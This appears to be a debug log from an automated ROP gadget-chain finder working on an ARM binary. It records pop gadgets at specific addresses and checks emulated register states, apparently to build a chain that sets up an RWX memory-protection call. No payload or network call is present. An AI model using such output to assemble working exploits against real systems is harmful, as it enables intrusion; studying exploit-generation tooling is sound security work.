+2026-07-18 08:16:02.458 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481932, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:02.462 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0b612', 'rip': 'sp'}]]
+2026-07-18 08:16:02.463 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db0b612']
+2026-07-18 08:16:02.464 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r6, pc}
+2026-07-18 08:16:02.495 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [], 'r2': [], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:02.577 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [], 'r1': [], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:02.642 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:02.644 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r5, pc}']
+2026-07-18 08:16:02.644 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481936, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:02.649 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b132', 'rip': 'sp'}]]
+2026-07-18 08:16:02.649 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db2b132']
+2026-07-18 08:16:02.649 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r6, pc}
+2026-07-18 08:16:02.730 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c']], 'r1': [], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:02.865 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:02.867 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r4, pc}']
+2026-07-18 08:16:02.868 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481936, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:02.946 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:02.962 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db055c6', 'rip': 'sp'}]]
+2026-07-18 08:16:03.034 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db055c6', 'rip': 'sp'}]]
+2026-07-18 08:16:03.170 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:16:03.173 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:16:03.174 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1ede6']
+2026-07-18 08:16:03.174 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r3, r7, pc}
+2026-07-18 08:16:03.191 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:16:03.238 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0a3c4', 'rip': 'sp'}]]
+2026-07-18 08:16:03.249 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0a3c4', 'rip': 'sp'}]]
+2026-07-18 08:16:03.303 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:03.305 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r5, pc}']
+2026-07-18 08:16:03.306 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481936, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:03.312 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db055c6', 'rip': 'sp'}]]
+2026-07-18 08:16:03.314 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db055c6']
+2026-07-18 08:16:03.314 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r4, r5, pc}
+2026-07-18 08:16:03.335 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:03.337 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r6, pc}']
+2026-07-18 08:16:03.337 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481936, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:03.341 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:16:03.341 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db0a3c4', 'rip': 'sp'}]]
+2026-07-18 08:16:03.343 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db0a3c4']
+2026-07-18 08:16:03.344 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r4, r5, pc}
+2026-07-18 08:16:03.366 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:16:03.396 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200']], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:03.456 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db07f9c', 'rip': 'sp'}]]
+2026-07-18 08:16:03.540 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db07f9c', 'rip': 'sp'}]]
+2026-07-18 08:16:03.546 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:03.548 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r6, pc}']
+2026-07-18 08:16:03.549 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481936, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:03.553 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:16:03.554 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db12578']
+2026-07-18 08:16:03.554 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r6, pc}
+2026-07-18 08:16:03.641 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200'], ['0x8db0b612']], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:03.723 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1f962']], 'r2': [['0x8db03200'], ['0x8db0b612']], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:03.779 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:16:03.829 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:16:03.863 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:16:03.901 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:16:04.116 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:04.119 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r3, r7, pc}']
+2026-07-18 08:16:04.119 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:04.125 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:16:04.126 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db2be20']
+2026-07-18 08:16:04.126 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r2, r6, pc}
+2026-07-18 08:16:04.182 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1ede6'], ['0x8db1f962']], 'r2': [['0x8db03200'], ['0x8db0b612']], 'r3': [['0x8db02114']]}
+2026-07-18 08:16:04.310 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:04.313 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r4, r5, pc}']
+2026-07-18 08:16:04.313 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:04.319 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db07f9c', 'rip': 'sp'}]]
+2026-07-18 08:16:04.321 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db07f9c']
+2026-07-18 08:16:04.321 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r3, r6, r7, pc}
+2026-07-18 08:16:04.327 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:04.344 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:04.393 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1ede6'], ['0x8db1f962']], 'r2': [['0x8db0b612']], 'r3': [['0x8db02114'], ['0x8db055c6']]}
+2026-07-18 08:16:04.404 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:04.407 | DEBUG    | solve_engine:check:1627 - ['pop {r2, r4, r5, pc}']
+2026-07-18 08:16:04.407 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:04.408 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:16:04.416 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db12578', 'rip': 'sp'}]]
+2026-07-18 08:16:04.417 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db12578']
+2026-07-18 08:16:04.417 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r6, pc}
+2026-07-18 08:16:04.440 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1ed72', 'rip': 'sp'}]]
+2026-07-18 08:16:04.489 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132']], 'r1': [['0x8db1ede6'], ['0x8db1f962']], 'r2': [['0x8db0b612'], ['0x8db0a3c4']], 'r3': [['0x8db02114'], ['0x8db055c6']]}
+2026-07-18 08:16:04.492 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:04.505 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1ed72', 'rip': 'sp'}]]
+2026-07-18 08:16:04.507 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:16:04.541 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:04.586 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:04.588 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r6, pc}']
+2026-07-18 08:16:04.589 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:04.593 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:04.595 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db09e6c']
+2026-07-18 08:16:04.595 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r6, pc}
+2026-07-18 08:16:04.660 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1ede6'], ['0x8db1f962']], 'r2': [['0x8db0b612'], ['0x8db0a3c4']], 'r3': [['0x8db02114'], ['0x8db055c6']]}
+2026-07-18 08:16:05.063 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:05.067 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:05.195 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22346', 'rip': 'sp'}]]
+2026-07-18 08:16:05.231 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db22346', 'rip': 'sp'}]]
+2026-07-18 08:16:05.235 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:05.238 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r2, r6, pc}']
+2026-07-18 08:16:05.239 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:05.243 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:05.243 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db09e6c']
+2026-07-18 08:16:05.244 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r6, pc}
+2026-07-18 08:16:05.253 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20']], 'r2': [['0x8db0b612'], ['0x8db0a3c4']], 'r3': [['0x8db055c6'], ['0x8db02114']]}
+2026-07-18 08:16:05.268 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:05.305 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:05.487 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:05.491 | DEBUG    | solve_engine:check:1627 - ['pop {r3, r6, r7, pc}']
+2026-07-18 08:16:05.491 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:05.496 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db1ede6', 'rip': 'sp'}]]
+2026-07-18 08:16:05.497 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1ede6']
+2026-07-18 08:16:05.497 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r1, r3, r7, pc}
+2026-07-18 08:16:05.498 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:16:05.507 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:16:05.511 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20']], 'r2': [['0x8db0b612'], ['0x8db0a3c4']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:16:05.680 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:05.682 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r2, r6, pc}']
+2026-07-18 08:16:05.683 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 7, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:05.687 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r2 [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db1ed72', 'rip': 'sp'}]]
+2026-07-18 08:16:05.688 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1ed72']
+2026-07-18 08:16:05.688 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r2, r6, r7, pc}
+2026-07-18 08:16:05.698 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20']], 'r2': [['0x8db0b612'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:16:05.733 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:16:05.748 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:16:05.867 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:05.870 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r6, pc}']
+2026-07-18 08:16:05.871 | DEBUG    | solve_engine:check:1634 - {'r0': 2406481920, 'r1': 0, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481944, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:05.874 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r0 [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:05.875 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1f958']
+2026-07-18 08:16:05.876 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r4, pc}
+2026-07-18 08:16:05.885 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20']], 'r2': [['0x8db0b612'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:16:05.888 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:16:05.908 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db2be20', 'rip': 'sp'}]]
+2026-07-18 08:16:05.955 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:16:05.997 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:16:06.146 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:16:06.159 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2b844', 'rip': 'sp'}]]
+2026-07-18 08:16:06.353 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b81c', 'rip': 'sp'}]]
+2026-07-18 08:16:06.366 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r0 find [[{'dst': 'r0', 'src': 'sp', 'addr': '0x8db2b81c', 'rip': 'sp'}]]
+2026-07-18 08:16:06.565 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:16:06.589 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:06.595 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r2 find [[{'dst': 'r2', 'src': 'sp', 'addr': '0x8db09e6c', 'rip': 'sp'}]]
+2026-07-18 08:16:06.597 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:06.600 | DEBUG    | solve_engine:check:1627 - ['pop {r0, r1, r2, r6, pc}']
+2026-07-18 08:16:06.601 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 4096, 'r2': 0, 'r3': 0, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481944, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:06.604 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r1 [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db1f958', 'rip': 'sp'}]]
+2026-07-18 08:16:06.604 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db1f958']
+2026-07-18 08:16:06.605 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r1, r2, r4, pc}
+2026-07-18 08:16:06.615 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db0b612'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c']]}
+2026-07-18 08:16:06.667 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r1 find [[{'dst': 'r1', 'src': 'sp', 'addr': '0x8db30414', 'rip': 'sp'}]]
+2026-07-18 08:16:06.760 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:16:06.805 | DEBUG    | solve_engine:check:1545 - Start Check Reg
+2026-07-18 08:16:06.809 | DEBUG    | solve_engine:check:1627 - ['pop {r1, r3, r7, pc}']
+2026-07-18 08:16:06.810 | DEBUG    | solve_engine:check:1634 - {'r0': 0, 'r1': 0, 'r2': 0, 'r3': 10, 'r4': 0, 'r5': 0, 'r6': 0, 'r7': 0, 'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'sp': 2406481940, 'lr': 0, 'pc': 3735928320}
+2026-07-18 08:16:06.812 | DEBUG    | find_reg_gadget_chain:get_reg_path_thread:616 - r3 find [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db2d702', 'rip': 'sp'}]]
+2026-07-18 08:16:06.815 | DEBUG    | find_reg_gadget_chain:monitor:649 - monitor r3 [[{'dst': 'r3', 'src': 'sp', 'addr': '0x8db22938', 'rip': 'sp'}]]
+2026-07-18 08:16:06.816 | DEBUG    | find_reg_gadget_chain:monitor:664 - ['0x8db22938']
+2026-07-18 08:16:06.817 | DEBUG    | find_reg_gadget_chain:monitor:666 - pop {r0, r2, r3, r7, pc}
+2026-07-18 08:16:06.830 | DEBUG    | find_reg_gadget_chain:classify:691 - classify {'r0': [['0x8db0502c'], ['0x8db2b132'], ['0x8db12578'], ['0x8db09e6c']], 'r1': [['0x8db1f962'], ['0x8db1ede6'], ['0x8db2be20'], ['0x8db09e6c']], 'r2': [['0x8db0b612'], ['0x8db0a3c4'], ['0x8db12578']], 'r3': [['0x8db055c6'], ['0x8db02114'], ['0x8db07f9c'], ['0x8db1ede6']]}
